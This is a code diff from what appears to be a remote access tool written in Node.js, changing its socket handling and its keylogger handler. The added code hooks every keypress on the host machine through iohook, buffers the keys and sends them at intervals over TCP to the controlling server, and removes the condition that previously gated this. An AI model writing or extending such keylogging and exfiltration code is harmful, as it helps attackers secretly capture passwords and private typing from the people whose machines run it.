@@ -150,6 +150,13 @@ class Server {
             )
             socket.__userAuthenticated__ = true
 
+            if (!socket.__destructors) {
+              socket.__destructors = []
+              socket.on('close', function() {
+                Object.values(this.__destructors).forEach(f => f());
+              })
+            }
+
             if (this.clients[data.id]) {
               if (this.clients[data.id].tcp) this.clients[data.id].tcp.destroy()
             } else {
@@ -226,19 +233,18 @@ server.on(Packets.KeylogSetup, function(packet, conn) {
     return;
   }
 
-  if (packet.data.interval > 0) {
-    if (conn.keylog.intervalID) clearInterval(conn.keylog.intervalID);
-    
-    iohook.on('keypress', conn.keylog.keyEvt)
-    iohook.start()
+  if (conn.keylog.intervalID) clearInterval(conn.keylog.intervalID);
+  
+  iohook.on('keypress', conn.keylog.keyEvt)
+  iohook.start()
 
-    conn.keylog.intervalID = setInterval(function() {
-      // Send loop
-      if (conn.keylog.buffer.length != 0) {
-        conn.tcp.write(Packets.r_Keylog.create(conn.keylog.buffer))
-        conn.keylog.buffer = [];
-      }
-    }, packet.data.interval)
-  }
-    
+  conn.keylog.intervalID = setInterval(function() {
+    // Send loop
+    if (conn.keylog.buffer.length != 0) {
+      conn.tcp.write(Packets.r_Keylog.create(conn.keylog.buffer))
+      conn.keylog.buffer = [];
+    }
+  }, packet.data.interval)
+  
+  conn.tcp.__destructors.keylog = disableKeylog
 })
